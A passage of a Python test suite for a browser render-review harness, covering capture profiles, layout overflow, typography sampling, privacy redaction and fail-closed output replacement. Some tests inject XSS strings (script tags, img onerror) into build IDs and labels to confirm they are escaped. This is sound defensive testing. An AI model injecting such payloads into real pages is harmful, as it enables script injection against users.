                    430,
                    932,
                    touch=True,
                    forced_colors="active",
                ),
                capture_profile(
                    "desktop-short-zoom",
                    1280,
                    480,
                    zoom="200-percent",
                ),
            ]
            secret_value = "MANIFEST_VALUE_MUST_NOT_PERSIST"
            interactions = [
                {"action": "focus", "selector": "#fixture-name"},
                {
                    "action": "fill",
                    "selector": "#fixture-name",
                    "value": secret_value,
                },
                {
                    "action": "select",
                    "selector": "#fixture-choice",
                    "value": "beta",
                },
                {"action": "check", "selector": "#fixture-check"},
                {"action": "click", "selector": "#fixture-state"},
            ]
            hostile_build_id = 'custom </title><script>alert("build")</script>'
            hostile_route_label = 'Fixture <img src=x onerror=alert("route")>'
            hostile_state_label = 'Reviewed </p><script>alert("state")</script>'
            scenario = capture_scenario(
                "interactive-state",
                [profile["id"] for profile in profiles],
                interactions=interactions,
            )
            scenario["route_label"] = hostile_route_label
            scenario["state_label"] = hostile_state_label
            payload = write_capture_manifest(
                manifest,
                profiles,
                [scenario],
            )
            result = run_harness(
                *browser_arguments(
                    site,
                    output,
                    browser,
                    hostile_build_id,
                    "--capture-manifest",
                    str(manifest),
                ),
                environment=browser_environment(module_dir),
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            report, _ = validate_report(output)
            contract = report["capture_contract"]
            self.assertEqual(contract["contract_mode"], "capture-manifest-v1")
            self.assertTrue(contract["capture_manifest"]["supplied"])
            self.assertEqual(contract["capture_manifest"]["schema_version"], 1)
            self.assertEqual(
                contract["capture_manifest"]["sha256"],
                hashlib.sha256(payload).hexdigest(),
            )
            self.assertEqual(contract["capture_manifest"]["bytes"], len(payload))
            self.assertEqual(
                [profile["viewport"]["width"] for profile in contract["profiles"]],
                [320, 375, 430, 1280],
            )
            self.assertEqual(contract["profiles"][-1]["viewport"]["height"], 480)
            self.assertEqual(
                contract["scenarios"][0]["route_label"], hostile_route_label
            )
            self.assertEqual(
                contract["scenarios"][0]["state_label"],
                hostile_state_label,
            )
            self.assertEqual(
                contract["scenarios"][0]["interactions"][1]["value"]["sha256"],
                hashlib.sha256(secret_value.encode()).hexdigest(),
            )
            serialized = (output / "render-review.json").read_text(encoding="utf-8")
            self.assertNotIn(secret_value, serialized)
            self.assertNotIn(str(manifest), serialized)
            contact_sheet = (output / "contact-sheet.html").read_text(
                encoding="utf-8"
            )
            self.assertIn(
                '<meta http-equiv="Content-Security-Policy" '
                'content="default-src \'none\'; img-src \'self\'; '
                'style-src \'unsafe-inline\'; base-uri \'none\'; '
                'form-action \'none\'">',
                contact_sheet,
            )
            self.assertNotIn(hostile_build_id, contact_sheet)
            self.assertNotIn(hostile_route_label, contact_sheet)
            self.assertNotIn(hostile_state_label, contact_sheet)
            self.assertIn(
                'custom &lt;/title&gt;&lt;script&gt;alert(&quot;build&quot;)'
                '&lt;/script&gt;',
                contact_sheet,
            )
            self.assertIn(
                'Fixture &lt;img src=x onerror=alert(&quot;route&quot;)&gt;',
                contact_sheet,
            )
            self.assertIn(
                'Reviewed &lt;/p&gt;&lt;script&gt;alert(&quot;state&quot;)'
                '&lt;/script&gt;',
                contact_sheet,
            )
            self.assertEqual(len(report["captures"]), 4)
            self.assertTrue(
                all(capture["interaction"]["status"] == "complete" for capture in report["captures"])
            )
            self.assertTrue(
                all(capture["interaction"]["completed_steps"] == 5 for capture in report["captures"])
            )
            text_capture = next(
                capture
                for capture in report["captures"]
                if capture["profile_id"] == "mobile-320-text"
            )
            self.assertEqual(
                text_capture["review_mode"]["text_spacing"]["evidence_status"],
                "applied-browser-css-override",
            )
            dark_capture = next(
                capture
                for capture in report["captures"]
                if capture["profile_id"] == "mobile-375-dark"
            )
            self.assertEqual(dark_capture["preferences"]["color_scheme"], "dark")
            self.assertEqual(dark_capture["preferences"]["reduced_motion"], "reduce")
            forced_capture = next(
                capture
                for capture in report["captures"]
                if capture["profile_id"] == "mobile-430-forced"
            )
            self.assertEqual(forced_capture["preferences"]["forced_colors"], "active")
            zoom_capture = next(
                capture
                for capture in report["captures"]
                if capture["profile_id"] == "desktop-short-zoom"
            )
            self.assertEqual(
                zoom_capture["review_mode"]["zoom"]["evidence_status"],
                "manual-required-not-simulated",
            )
            self.assertTrue(
                any(
                    "zoom modes are not simulated" in limitation
                    for limitation in report["manual_review"]["limitations"]
                )
            )

    def test_internal_horizontal_overflow_surfaces_leaf_culprit_without_flagging_handlers(self) -> None:
        module_dir, browser = self.require_browser()
        fixture = (
            PACKAGE_ROOT
            / "maintainer"
            / "tests"
            / "fixtures"
            / "rendered-review-internal-horizontal-overflow"
        )
        with tempfile.TemporaryDirectory(
            prefix="design-dna-internal-horizontal-overflow-"
        ) as root:
            root_path = Path(root)
            output = root_path / "review"
            manifest = root_path / "capture-manifest.json"
            profile = capture_profile(
                "mobile-overflow-390", 390, 844, touch=True
            )
            write_capture_manifest(
                manifest,
                [profile],
                [capture_scenario("internal-overflow", [profile["id"]])],
            )
            result = run_harness(
                *browser_arguments(
                    fixture,
                    output,
                    browser,
                    "internal-horizontal-overflow",
                    "--capture-manifest",
                    str(manifest),
                ),
                environment=browser_environment(module_dir),
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            report, _validator = validate_report(output)
            capture = report["captures"][0]
            layout = capture["document"]["layout"]
            self.assertTrue(layout["horizontal_overflow"])

            title_candidate = next(
                candidate
                for candidate in layout["overflow_candidates"]
                if candidate["selector"] == "#overflow-title"
            )
            self.assertIn(
                "internal-horizontal-content-overflow",
                title_candidate["reasons"],
            )
            self.assertLessEqual(title_candidate["rect"]["right"], 391)
            self.assertEqual(title_candidate["client"]["width"], 125)
            self.assertGreater(
                title_candidate["scroll"]["width"],
                title_candidate["client"]["width"] + 1,
            )
            self.assertEqual(title_candidate["overflow"]["x"], "visible")

            selectors = {
                candidate["selector"]
                for candidate in layout["overflow_candidates"]
            }
            self.assertNotIn("#intentional-scroll", selectors)
            self.assertNotIn("#intentional-scroll-track", selectors)
            self.assertNotIn("#intentional-scroll-content", selectors)
            self.assertNotIn("#intentional-hidden", selectors)
            self.assertNotIn("#intentional-clip", selectors)

    def test_peer_surface_occluding_caption_text_is_reported(self) -> None:
        module_dir, browser = self.require_browser()
        fixture = (
            PACKAGE_ROOT
            / "maintainer"
            / "tests"
            / "fixtures"
            / "rendered-review-text-occlusion"
        )
        with tempfile.TemporaryDirectory(prefix="design-dna-text-occlusion-") as root:
            root_path = Path(root)
            output = root_path / "review"
            manifest = root_path / "capture-manifest.json"
            profile = capture_profile("caption-wide-1440", 1440, 900)
            write_capture_manifest(
                manifest,
                [profile],
                [capture_scenario("caption-occlusion", [profile["id"]])],
            )
            result = run_harness(
                *browser_arguments(
                    fixture,
                    output,
                    browser,
                    "caption-occlusion",
                    "--capture-manifest",
                    str(manifest),
                ),
                environment=browser_environment(module_dir),
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            report, _validator = validate_report(output)
            candidates = report["captures"][0]["document"]["layout"]["overflow_candidates"]
            caption = next(
                candidate
                for candidate in candidates
                if candidate["selector"] == "#occluded-caption"
            )
            self.assertIn("text-occluded-by-peer", caption["reasons"])
            self.assertIn("#metadata-band", caption["occluding_selectors"])
            self.assertFalse(
                any(candidate["selector"] == "#clear-copy" for candidate in candidates)
            )

    def test_ten_route_anthology_captures_matched_desktop_and_mobile(self) -> None:
        """Exercise the real browser path needed by a ten-route Range Study."""
        module_dir, browser = self.require_browser()
        fixture = (
            PACKAGE_ROOT
            / "maintainer"
            / "evals"
            / "fixtures"
            / "inputs"
            / "route-family-anthology-positive"
        )
        routes = [
            "/",
            "/field-notes/",
            "/timeline/",
            "/listening-map/",
            "/data-room/",
            "/oral-history/",
            "/object-catalog/",
            "/night-walk/",
            "/workshop/",
            "/visit/",
        ]
        with tempfile.TemporaryDirectory(
            prefix="design-dna-ten-route-browser-"
        ) as root:
            root_path = Path(root)
            output = root_path / "review"
            manifest = root_path / "capture-manifest.json"
            profiles = [
                capture_profile("range-desktop-1440", 1440, 900),
                capture_profile(
                    "range-mobile-390",
                    390,
                    844,
                    touch=True,
                ),
            ]
            scenarios = []
            for index, route in enumerate(routes, start=1):
                scenario = capture_scenario(
                    f"route-{index:02d}-baseline",
                    [profile["id"] for profile in profiles],
                    route=route,
                )
                scenario["route_label"] = f"Anthology route {index:02d}"
                scenario["state_label"] = "Direct-entry baseline"
                scenarios.append(scenario)
            write_capture_manifest(manifest, profiles, scenarios)
            route_arguments = [
                argument
                for route in routes
                for argument in ("--route", route)
            ]

            result = run_harness(
                *browser_arguments(
                    fixture,
                    output,
                    browser,
                    "alder-reach-ten-route-two-viewport",
                    "--capture-manifest",
                    str(manifest),
                    *route_arguments,
                ),
                environment=browser_environment(module_dir),
                timeout=300,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            report, _ = validate_report(output)
            self.assertTrue(report["execution_ok"])
            self.assertEqual(len(report["routes"]), 10)
            self.assertEqual(len(report["captures"]), 20)
            self.assertEqual(
                {profile["viewport"]["width"] for profile in report[
                    "capture_contract"
                ]["profiles"]},
                {390, 1440},
            )
            self.assertTrue(
                all(
                    capture["capture_status"] == "complete"
                    and capture["http_status"] == 200
                    and capture["requested_url"] == capture["final_url"]
                    and capture["screenshot"] is not None
                    for capture in report["captures"]
                )
            )
            self.assertEqual(
                {route["requested"] for route in report["routes"]},
                set(routes),
            )

    def test_capture_manifest_interaction_selector_and_navigation_fail_closed(self) -> None:
        module_dir, browser = self.require_browser()
        with tempfile.TemporaryDirectory(prefix="design-dna-manifest-actions-") as root:
            root_path = Path(root)
            site = make_site(root_path)
            profile = capture_profile("action-profile", 320, 640, touch=True)
            cases = [
                (
                    "selector-count",
                    {"action": "focus", "selector": "p"},
                    "interaction-selector-count",
                ),
                (
                    "cross-origin-click",
                    {"action": "click", "selector": "#external-link"},
                    "interaction-cross-origin-navigation",
                ),
            ]
            for name, action, expected_code in cases:
                with self.subTest(name=name):
                    manifest = root_path / f"{name}.json"
                    write_capture_manifest(
                        manifest,
                        [profile],
                        [
                            capture_scenario(
                                f"{name}-state",
                                ["action-profile"],
                                interactions=[action],
                            )
                        ],
                    )
                    output = root_path / f"{name}-output"
                    result = run_harness(
                        *browser_arguments(
                            site,
                            output,
                            browser,
                            name,
                            "--capture-manifest",
                            str(manifest),
                        ),
                        environment=browser_environment(module_dir),
                    )
                    self.assertEqual(result.returncode, 1, result.stderr)
                    report, _ = validate_report(output)
                    self.assertFalse(report["execution_ok"])
                    self.assertEqual(
                        report["captures"][0]["failure"]["code"],
                        expected_code,
                    )
                    self.assertEqual(
                        report["captures"][0]["interaction"]["status"],
                        "failed",
                    )

    def test_typography_sampling_is_stratified_bounded_and_deterministic(self) -> None:
        module_dir, browser = self.require_browser()
        with tempfile.TemporaryDirectory(prefix="design-dna-type-sampling-") as root:
            root_path = Path(root)
            site = make_site(root_path)
            content: list[str] = [
                "<!doctype html><html lang='en'><head><meta charset='utf-8'>",
                "<meta name='viewport' content='width=device-width,initial-scale=1'>",
                "<title>Typography sampling fixture</title>",
                "<link rel='stylesheet' href='styles.css'></head><body>",
                "<nav aria-label='Fixture navigation'>",
                *[f"<a href='#body-{index * 20:03d}'>Nav {index:02d}</a>" for index in range(8)],
                "</nav><main><h1>Typography sampling fixture</h1>",
            ]
            for index in range(180):
                if index % 30 == 0:
                    content.append(f"<h2>Chapter {index // 30 + 1}</h2>")
                content.append(
                    f"<p id='body-{index:03d}'>Body sample {index:03d}</p>"
                )
            content.extend(
                [
                    "<figure><figcaption>Caption sample</figcaption></figure>",
                    "<pre><code>Code sample</code></pre>",
                    "<ul>",
                    *[f"<li>List sample {index:02d}</li>" for index in range(12)],
                    "</ul>",
                    "<label>Label sample <input value='Input sample'></label>",
                    "<button type='button'>Button sample</button>",
                    "<a href='#body-179'>Other link sample</a>",
                    "</main></body></html>",
                ]
            )
            (site / "index.html").write_text("\n".join(content), encoding="utf-8")

            manifest = root_path / "capture-manifest.json"
            profiles = [
                capture_profile("type-sample-a", 900, 700),
                capture_profile("type-sample-b", 900, 700),
            ]
            write_capture_manifest(
                manifest,
                profiles,
                [
                    capture_scenario(
                        "type-sampling",
                        [profile["id"] for profile in profiles],
                    )
                ],
            )
            output = root_path / "review"
            result = run_harness(
                *browser_arguments(
                    site,
                    output,
                    browser,
                    "type-sampling",
                    "--capture-manifest",
                    str(manifest),
                ),
                environment=browser_environment(module_dir),
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            report, _ = validate_report(output)
            self.assertEqual(len(report["captures"]), 2)

            selections: list[list[tuple[str, str]]] = []
            for capture in report["captures"]:
                typography = capture["document"]["typography_samples"]
                sampling = capture["document"]["typography_sampling"]
                self.assertEqual(
                    sampling["strategy"],
                    "semantic-role-and-document-position-stratified-v1",
                )
                self.assertGreater(sampling["candidate_count"], 120)
                self.assertEqual(sampling["sampled_count"], 120)
                self.assertEqual(sampling["sampled_count"], len(typography))
                self.assertTrue(sampling["truncated"])
                self.assertEqual(
                    sampling["role_counts"]["body"]["candidate_count"],
                    180,
                )
                self.assertGreater(
                    sampling["role_counts"]["heading"]["sampled_count"],
                    0,
                )
                self.assertGreater(
                    sampling["role_counts"]["navigation"]["sampled_count"],
                    0,
                )
                self.assertGreater(
                    sampling["role_counts"]["control"]["sampled_count"],
                    0,
                )
                self.assertEqual(
                    sum(
                        counts["candidate_count"]
                        for counts in sampling["role_counts"].values()
                    ),
                    sampling["candidate_count"],
                )
                self.assertEqual(
                    sum(
                        counts["sampled_count"]
                        for counts in sampling["role_counts"].values()
                    ),
                    sampling["sampled_count"],
                )
                sampled_text = {sample["text_sample"] for sample in typography}
                self.assertIn("Body sample 000", sampled_text)
                self.assertIn("Body sample 179", sampled_text)
                selections.append(
                    [
                        (sample["selector"], sample["role"])
                        for sample in typography
                    ]
                )
            self.assertEqual(selections[0], selections[1])
            contact_sheet = (output / "contact-sheet.html").read_text(
                encoding="utf-8"
            )
            self.assertIn("<dt>typography_candidates</dt>", contact_sheet)
            self.assertIn("<dt>typography_sampled</dt><dd>120</dd>", contact_sheet)
            self.assertIn("<dt>typography_truncated</dt><dd>true</dd>", contact_sheet)

    def test_secure_local_capture_privacy_marker_and_replacement(self) -> None:
        module_dir, browser = self.require_browser()
        with tempfile.TemporaryDirectory(prefix="design-dna-secure-local-") as root:
            root_path = Path(root)
            site = make_site(root_path)
            output = root_path / "review"
            first = run_harness(
                *browser_arguments(site, output, browser, "secure-local"),
                environment=browser_environment(module_dir),
            )
            self.assertEqual(first.returncode, 0, first.stderr)
            report, validator = validate_report(output)
            self.assertEqual(report["schema_version"], 3)
            self.assertEqual(report["build"]["target_kind"], "local-directory")
            self.assertIsNotNone(report["source_snapshot"])
            self.assertEqual(
                [item["id"] for item in report["capture_contract"]["profiles"]],
                EXPECTED_PROFILE_IDS,
            )
            self.assertEqual(
                report["capture_contract"]["contract_mode"],
                "deterministic-default-v1",
            )
            self.assertFalse(
                report["capture_contract"]["capture_manifest"]["supplied"]
            )
            self.assertEqual(
                len(report["capture_contract"]["scenarios"]),
                1,
            )
            self.assertEqual(len(report["captures"]), 9)
            self.assertTrue(all(item["capture_status"] == "complete" for item in report["captures"]))
            self.assertTrue(all(item["screenshot"] for item in report["captures"]))
            for capture in report["captures"]:
                silhouette = capture["document"]["route_silhouette"]
                self.assertGreaterEqual(len(silhouette), 2)
                for region in silhouette:
                    self.assertIn("normalized_rect", region)
                    self.assertIn("grid_column_count", region)
                    self.assertIn("visual_column_count", region)
                    self.assertIn("media_count", region)
                    self.assertIn("control_count", region)
                    self.assertIn("heading_font_size_px", region)
                typography = capture["document"]["typography_samples"]
                sampling = capture["document"]["typography_sampling"]
                self.assertGreaterEqual(len(typography), 2)
                self.assertEqual(sampling["candidate_count"], len(typography))
                self.assertEqual(sampling["sampled_count"], len(typography))
                self.assertFalse(sampling["truncated"])
                self.assertTrue(
                    any(sample["role"] == "heading" for sample in typography)
                )
                for sample in typography:
                    self.assertIn("letter_spacing", sample)
                    self.assertIn("line_height", sample)
                    self.assertIn("font_stretch", sample)
                    self.assertIn("rendered_line_count_estimate", sample)
            self.assertTrue(
                all(item["network"]["blocked_outbound"] for item in report["captures"])
            )
            self.assertTrue(
                all(
                    any(
                        blocked["url"] == "https://example.invalid/collect"
                        for blocked in item["network"]["blocked_outbound"]
                    )
                    for item in report["captures"]
                )
            )
            manifest_paths = {
                item["path"] for item in report["source_snapshot"]["manifest"]["files"]
            }
            self.assertIn("index.html", manifest_paths)
            self.assertIn("styles.css", manifest_paths)
            self.assertNotIn(".env", manifest_paths)
            self.assertNotIn("vite.config.js", manifest_paths)
            self.assertFalse(any(path.startswith(".git/") for path in manifest_paths))
            self.assertFalse(any(path.startswith(".design-dna/") for path in manifest_paths))

            serialized = (output / "render-review.json").read_text(encoding="utf-8")
            for secret in (
                "SIGNED_SECRET",
                "LOCAL_SECRET",
                "EXFIL_SECRET",
                "WS_SECRET",
                "PAGE_SECRET",
                "ENV_SECRET",
                "SOURCE_SECRET",
                "person@example.com",
                r"C:\Users\alice",
                str(site),
                str(output),
                str(browser.parent),
            ):
                self.assertNotIn(secret, serialized)
            self.assertNotIn("executable_path", serialized)
            self.assertTrue(report["privacy"]["visual_content_not_redacted"])
            self.assertFalse(report["privacy"]["absolute_paths_persisted"])

            for capture in report["captures"]:
                screenshot = capture["screenshot"]
                screenshot_path = output / screenshot["path"]
                self.assertEqual(screenshot_path.stat().st_size, screenshot["bytes"])
                self.assertEqual(sha256_file(screenshot_path), screenshot["sha256"])
            contact = report["artifacts"]["contact_sheet"]
            self.assertEqual(sha256_file(output / contact["path"]), contact["sha256"])

            marker = json.loads(
                (output / ".design-dna-render-review.json").read_text(encoding="utf-8")
            )
            self.assertEqual(marker["schema_version"], 3)
            self.assertEqual(marker["marker_type"], "design-dna-render-review-output")
            self.assertEqual(marker["output_identity"], report["output_identity"])
            self.assertEqual(
                marker["report"]["sha256"], sha256_file(output / "render-review.json")
            )
            self.assertEqual(
                marker["report"]["bytes"], (output / "render-review.json").stat().st_size
            )

            sentinel = output / "replace-sentinel.txt"
            sentinel.write_text("old owned evidence", encoding="utf-8")
            replacement = run_harness(
                *browser_arguments(
                    site, output, browser, "secure-local-replacement", "--replace"
                ),
                environment=browser_environment(module_dir),
            )
            self.assertEqual(replacement.returncode, 0, replacement.stderr)
            self.assertFalse(sentinel.exists())
            replacement_report, _ = validate_report(output)
            self.assertEqual(replacement_report["build"]["id"], "secure-local-replacement")

            preserve = output / "preserve-after-failure.txt"
            preserve.write_text("preserve prior output", encoding="utf-8")
            empty_modules = root_path / "empty-modules"
            empty_modules.mkdir()
            failed_replace = run_harness(
                str(site),
                "--output",
                str(output),
                "--build-id",
                "failed-replacement",
                "--replace",
                environment={
                    "DESIGN_DNA_PLAYWRIGHT_MODULE_DIR": str(empty_modules),
                    "NODE_PATH": "",
                },
            )
            self.assertEqual(failed_replace.returncode, 3)
            self.assertEqual(
                parse_single_json_line(failed_replace.stderr)["error"]["code"],
                "playwright-unavailable",
            )
            self.assertEqual(
                preserve.read_text(encoding="utf-8"), "preserve prior output"
            )
            self.assertFalse(output_lock_path(output).exists())

            forged = root_path / "Documents" / "Copied Review"
            forged.parent.mkdir()
            shutil.copytree(output, forged)
            forged_marker_path = forged / ".design-dna-render-review.json"
            forged_marker = json.loads(forged_marker_path.read_text(encoding="utf-8"))
            normalized_forged = str(forged.resolve())
            if sys.platform == "win32":
                normalized_forged = normalized_forged.lower()
            forged_marker["output_identity"]["path_sha256"] = hashlib.sha256(
                normalized_forged.encode()
            ).hexdigest()
            forged_marker_path.write_text(
                json.dumps(forged_marker, indent=2) + "\n", encoding="utf-8"
            )
            forged_sentinel = forged / "do-not-delete.txt"
            forged_sentinel.write_text("forgery must survive", encoding="utf-8")
            forged_result = run_harness(
                str(site),
                "--output",
                str(forged),
                "--build-id",
                "forged-marker",
                "--replace",
            )
            self.assertEqual(forged_result.returncode, 2)
            self.assertEqual(
                parse_single_json_line(forged_result.stderr)["error"]["code"],
                "output-report-identity-mismatch",
            )
            self.assertEqual(
                forged_sentinel.read_text(encoding="utf-8"), "forgery must survive"
            )

            version_forged = root_path / "version-forged-review"
            shutil.copytree(output, version_forged)
            version_marker_path = (
                version_forged / ".design-dna-render-review.json"
            )
            version_marker = json.loads(
                version_marker_path.read_text(encoding="utf-8")
            )
            normalized_version_forged = str(version_forged.resolve())
            if sys.platform == "win32":
                normalized_version_forged = normalized_version_forged.lower()
            version_path_hash = hashlib.sha256(
                normalized_version_forged.encode()
            ).hexdigest()
            version_marker["tool"]["version"] = "9.9.9"
            version_marker["output_identity"]["path_sha256"] = version_path_hash
            version_marker_path.write_text(
                json.dumps(version_marker, indent=2) + "\n", encoding="utf-8"
            )
            version_sentinel = version_forged / "strict-version-sentinel.txt"
            version_sentinel.write_text(
                "wrong tool identity must survive", encoding="utf-8"
            )
            version_result = run_harness(
                str(site),
                "--output",
                str(version_forged),
                "--build-id",
                "version-forged-marker",
                "--replace",
            )
            self.assertEqual(version_result.returncode, 2)
            self.assertEqual(
                parse_single_json_line(version_result.stderr)["error"]["code"],
                "output-marker-invalid",
            )
            self.assertEqual(
                version_sentinel.read_text(encoding="utf-8"),
                "wrong tool identity must survive",
            )

            file_output = root_path / "file-review"
            file_result = run_harness(
                *browser_arguments(
                    site / "index.html", file_output, browser, "local-file-snapshot"
                ),
                environment=browser_environment(module_dir),
            )
            self.assertEqual(file_result.returncode, 0, file_result.stderr)
            file_report, _ = validate_report(file_output)
            self.assertEqual(file_report["build"]["target_kind"], "local-file")
            self.assertTrue(
                all(not item["requested_url"].startswith("file:") for item in file_report["captures"])
            )
            self.assertTrue(
                all(item["requested_url"].startswith("http://127.0.0.1:") for item in file_report["captures"])
            )

            inconsistent = json.loads(json.dumps(report))
            inconsistent["execution_ok"] = False
            inconsistent["quality_status"] = "execution-incomplete"
            self.assertTrue(list(validator.iter_errors(inconsistent)))

    def test_local_scroll_sweep_policy_is_recorded_in_report(self) -> None:
        module_dir, browser = self.require_browser()
        with tempfile.TemporaryDirectory(prefix="design-dna-local-scroll-sweep-") as root:
            root_path = Path(root)
            site = make_site(root_path, tall=True)
            output = root_path / "review"
            manifest = root_path / "capture-manifest.json"
            profile = capture_profile("scroll-sweep-desktop", 1024, 768)
            write_capture_manifest(
                manifest,
                [profile],
                [capture_scenario("scroll-sweep-state", [profile["id"]])],
            )

            result = run_harness(
                *browser_arguments(
                    site,
                    output,
                    browser,
                    "local-scroll-sweep",
                    "--capture-manifest",
                    str(manifest),
                    "--scroll-sweep",
                ),
                environment=browser_environment(module_dir),
            )

            self.assertEqual(result.returncode, 0, result.stderr)
            report, _ = validate_report(output)
            self.assertEqual(
                report["capture_contract"]["lazy_loading_policy"],
                "opt-in-local-scroll-sweep-assets-waited-and-full-page-screenshot-attempted",
            )
            self.assertEqual(len(report["captures"]), 1)
            self.assertEqual(report["captures"][0]["capture_status"], "complete")

    def test_main_404_and_cross_origin_redirect_are_incomplete(self) -> None:
        module_dir, browser = self.require_browser()
        with tempfile.TemporaryDirectory(prefix="design-dna-http-failures-") as root:
            root_path = Path(root)
            site = make_site(root_path)
            output_404 = root_path / "review-404"
            missing = run_harness(
                *browser_arguments(
                    site,
                    output_404,
                    browser,
                    "missing-route",
                    "--route",
                    "/missing.html",
                ),
                environment=browser_environment(module_dir),
            )
            self.assertEqual(missing.returncode, 1, missing.stderr)
            missing_report, _ = validate_report(output_404)
            self.assertFalse(missing_report["execution_ok"])
            self.assertEqual(missing_report["quality_status"], "execution-incomplete")
            failed_missing = [
                capture
                for capture in missing_report["captures"]
                if capture["route_id"] == "route-02"
            ]
            self.assertEqual(len(failed_missing), len(EXPECTED_PROFILE_IDS))
            self.assertTrue(
                all(item["failure"]["code"] == "main-document-http-error" for item in failed_missing)
            )
            self.assertTrue(all(item["http_status"] == 404 for item in failed_missing))

            class DestinationHandler(QuietHandler):
                def do_GET(self) -> None:
                    payload = b"<!doctype html><title>Redirect destination</title><h1>Destination</h1>"
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html; charset=utf-8")
                    self.send_header("Content-Length", str(len(payload)))
                    self.end_headers()
                    self.wfile.write(payload)

            destination = ThreadingHTTPServer(("127.0.0.1", 0), DestinationHandler)
            destination_thread = threading.Thread(
                target=destination.serve_forever, daemon=True
            )
            destination_thread.start()
            destination_url = (
                f"http://127.0.0.1:{destination.server_address[1]}/destination"
            )

            class RedirectHandler(QuietHandler):
                def do_GET(self) -> None:
                    self.send_response(302)
                    self.send_header("Location", destination_url)
                    self.end_headers()

            redirect = ThreadingHTTPServer(("127.0.0.1", 0), RedirectHandler)
            redirect_thread = threading.Thread(target=redirect.serve_forever, daemon=True)
            redirect_thread.start()
            try:
                signed_target = (
                    f"http://127.0.0.1:{redirect.server_address[1]}/"
                    "?signature=REDIRECT_SECRET#fragment"
                )
                output_redirect = root_path / "review-redirect"
                redirected = run_harness(
                    *browser_arguments(
                        signed_target,
                        output_redirect,
                        browser,
                        "cross-origin-redirect",
                    ),
                    environment=browser_environment(module_dir),
                )
            finally:
                redirect.shutdown()
                destination.shutdown()
                redirect.server_close()
                destination.server_close()
                redirect_thread.join(timeout=5)
                destination_thread.join(timeout=5)

            self.assertEqual(redirected.returncode, 1, redirected.stderr)
            redirect_report, _ = validate_report(output_redirect)
            self.assertFalse(redirect_report["execution_ok"])
            self.assertTrue(
                all(
                    item["failure"]["code"] == "unexpected-cross-origin-redirect"
                    for item in redirect_report["captures"]
                )
            )
            redirect_serialized = (output_redirect / "render-review.json").read_text(
                encoding="utf-8"
            )
            self.assertNotIn("REDIRECT_SECRET", redirect_serialized)
            self.assertNotIn("?signature=", redirect_serialized)
            self.assertNotIn("#fragment", redirect_serialized)

    def test_capture_and_report_quotas_are_fail_closed(self) -> None:
        module_dir, browser = self.require_browser()
        with tempfile.TemporaryDirectory(prefix="design-dna-render-quotas-") as root:
            root_path = Path(root)
            site = make_site(root_path, tall=True)
            cases = [
                (
                    "page-height",
                    ("--max-page-height", "500"),
                    "page-height-limit-exceeded",
                ),
                (
                    "screenshot-bytes",
                    ("--max-screenshot-bytes", "1024"),
                    "screenshot-byte-limit-exceeded",
                ),
                (
                    "total-artifacts",
                    (
                        "--max-report-bytes",
                        "1048576",
                        "--max-artifact-bytes",
                        str(
                            1048576
                            + (2 * ARTIFACT_METADATA_RESERVE_BYTES)
                        ),
                        "--max-screenshot-bytes",
                        "1048576",
                    ),
                    "artifact-byte-limit-exceeded",
                ),
            ]
            for name, flags, expected_code in cases:
                with self.subTest(name=name):
                    output = root_path / f"review-{name}"
                    result = run_harness(
                        *browser_arguments(
                            site, output, browser, f"quota-{name}", *flags
                        ),
                        environment=browser_environment(module_dir),
                    )
                    self.assertEqual(result.returncode, 1, result.stderr)
                    report, _ = validate_report(output)
                    self.assertFalse(report["execution_ok"])
                    self.assertTrue(
                        any(
                            capture["failure"] is not None
                            and capture["failure"]["code"] == expected_code
                            for capture in report["captures"]
                        )
                    )

            report_output = root_path / "review-report-limit"
            report_limited = run_harness(
                *browser_arguments(
                    site,
                    report_output,
                    browser,
                    "quota-report",
                    "--max-page-height",
                    "500",
                    "--max-report-bytes",
                    "4096",
                ),
                environment=browser_environment(module_dir),
            )
            self.assertEqual(report_limited.returncode, 2, report_limited.stdout)
            report_payload = parse_single_json_line(report_limited.stderr)
            self.assertEqual(report_payload["quality_status"], "execution-incomplete")
            self.assertEqual(
                report_payload["error"]["code"], "report-byte-limit-exceeded"
            )
            self.assertFalse(report_output.exists())

    def test_source_drift_and_concurrent_replace_preserve_owned_output(self) -> None:
        module_dir, browser = self.require_browser()
        with tempfile.TemporaryDirectory(prefix="design-dna-drift-lock-") as root:
            root_path = Path(root)
            site = make_site(root_path)

            drift_output = root_path / "drift-output"
            drift_process = popen_harness(
                *browser_arguments(
                    site,
                    drift_output,
                    browser,
                    "source-drift",
                    "--settle-ms",
                    "600",
                ),
                environment=browser_environment(module_dir),
            )
            snapshot_ready = False
            deadline = time.monotonic() + 20
            while time.monotonic() < deadline:
                transactions = list(
                    root_path.glob(".drift-output.design-dna-transaction-*")
                )
                if any(
                    (transaction / "frozen-public-source" / "index.html").is_file()
                    for transaction in transactions
                ):
                    snapshot_ready = True
                    break
                if drift_process.poll() is not None:
                    break
                time.sleep(0.05)
            self.assertTrue(snapshot_ready, "The frozen source snapshot was not observed.")
            (site / "styles.css").write_text(
                FIXTURE_CSS + "\nbody{letter-spacing:.01em}", encoding="utf-8"
            )
            drift_stdout, drift_stderr = drift_process.communicate(timeout=180)
            self.assertEqual(drift_process.returncode, 2, drift_stdout)
            drift_payload = parse_single_json_line(drift_stderr)
            self.assertEqual(drift_payload["error"]["code"], "source-drift")
            self.assertEqual(drift_payload["quality_status"], "execution-incomplete")
            self.assertFalse(drift_output.exists())
            self.assertFalse(output_lock_path(drift_output).exists())

            stable_site = make_site(root_path / "stable")
            owned_output = root_path / "owned-output"
            initial = run_harness(
                *browser_arguments(
                    stable_site, owned_output, browser, "concurrency-initial"
                ),
                environment=browser_environment(module_dir),
            )
            self.assertEqual(initial.returncode, 0, initial.stderr)
            changed_replace = popen_harness(
                *browser_arguments(
                    stable_site,
                    owned_output,
                    browser,
                    "content-change",
                    "--replace",
                    "--settle-ms",
                    "600",
                ),
                environment=browser_environment(module_dir),
            )
            deadline = time.monotonic() + 20
            while time.monotonic() < deadline and not output_lock_path(
                owned_output
            ).is_file():
                if changed_replace.poll() is not None:
                    break
                time.sleep(0.05)
            self.assertTrue(output_lock_path(owned_output).is_file())
            concurrent_file = owned_output / "concurrent-intruder.txt"
            concurrent_file.write_text(
                "This file must survive a failed replacement.", encoding="utf-8"
            )
            changed_stdout, changed_stderr = changed_replace.communicate(timeout=180)
            self.assertEqual(changed_replace.returncode, 2, changed_stdout)
